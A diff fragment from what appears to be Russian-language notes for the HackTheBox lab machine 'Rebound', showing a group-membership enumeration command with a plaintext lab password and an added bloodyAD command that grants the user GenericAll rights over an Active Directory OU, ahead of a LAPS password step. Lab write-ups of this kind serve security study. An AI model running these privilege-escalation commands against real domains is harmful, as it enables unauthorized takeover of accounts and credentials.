@@ -474,6 +474,7 @@ pip3 install -r requirements.txt
 
 net rpc group members "ServiceMGMT"  -U "rebound.htb"/"oorend"%'1GR8t@$$4u' -S "dc01.REBOUND.HTB"		(проверка членов группы)
 
+./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB'  oorend		(Generic all - добавить себя в OU )
 
  # Получение пароля LAPS Admin
 
